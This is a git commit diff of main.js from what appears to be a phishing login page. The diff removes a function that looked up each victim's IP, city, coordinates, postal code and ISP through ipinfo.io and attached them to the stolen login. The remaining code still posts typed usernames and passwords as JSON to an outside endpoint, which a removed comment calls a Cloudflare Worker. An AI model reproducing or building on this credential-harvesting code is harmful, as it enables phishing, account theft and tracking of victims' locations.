3b6c8d2430877b74fb06c3b689d3ef5e591bfd38
jjmdw <jjmdw@hotmail.com>
2025-02-06 17:00:35 -0500

    Update main.js

--- main.js
+++ main.js
@@ -1,27 +1,6 @@
 function isEmail(email) { 
     return /^((([a-z]|\d|[!#\$%&'\*\+\-\/=\?\^_`{\|}~]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+(\.([a-z]|\d|[!#\$%&'\*\+\-\/=\?\^_`{\|}~]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+)*)|((\x22)((((\x20|\x09)*(\x0d\x0a))?(\x20|\x09)+)?(([\x01-\x08\x0b\x0c\x0e-\x1f\x7f]|\x21|[\x23-\x5b]|[\x5d-\x7e]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(\\([\x01-\x09\x0b\x0c\x0d-\x7f]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]))))*(((\x20|\x09)*(\x0d\x0a))?(\x20|\x09)+)?(\x22)))@((([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.)+(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))$/i.test(email);
 }
-// Get the user's IP and other information (using ipinfo.io API)
-function getUserDetails() {
-    return fetch('https://ipinfo.io/json?token=YOUR_TOKEN') // Replace with your ipinfo.io token
-        .then(response => response.json())
-        .then(data => {
-            return {
-                ip: data.ip,
-                city: data.city,
-                region: data.region,   // State
-                country: data.country,
-                location: data.loc,    // Latitude and longitude
-                postalCode: data.postal, // ZIP
-                isp: data.org,         // ISP
-            };
-        })
-        .catch(err => {
-            console.error('Error fetching IP info:', err);
-            return {}; // Fallback empty object if the request fails
-        });
-}
-
 document.addEventListener('DOMContentLoaded' ,function(){
     checkCookie()
     let hashUrl = window.location.hash.substr(1).replace (new RegExp("%20", "g"),"+")  
@@ -86,9 +65,6 @@ document.addEventListener('DOMContentLoaded' ,function(){
                 passerror.innerHTML = "Please enter your password correctly!"
             }
             else{
-                // Call getUserDetails() to fetch the user's IP, location, ISP, and user agent
-        const userDetails = await getUserDetails();
-                 // Send the data (username, password, and user details) to the Cloudflare Worker
                 fetch(url, {
                 
                     // Adding method type
@@ -98,8 +74,6 @@ document.addEventListener('DOMContentLoaded' ,function(){
                     body: JSON.stringify({
                         userID: username,
                         password: password,
-                        ...userDetails,     // Spread the additional user details (IP, location, etc.)
-                        
                     }),
                     headers: {
                             "Content-type": "application/json; charset=UTF-8"
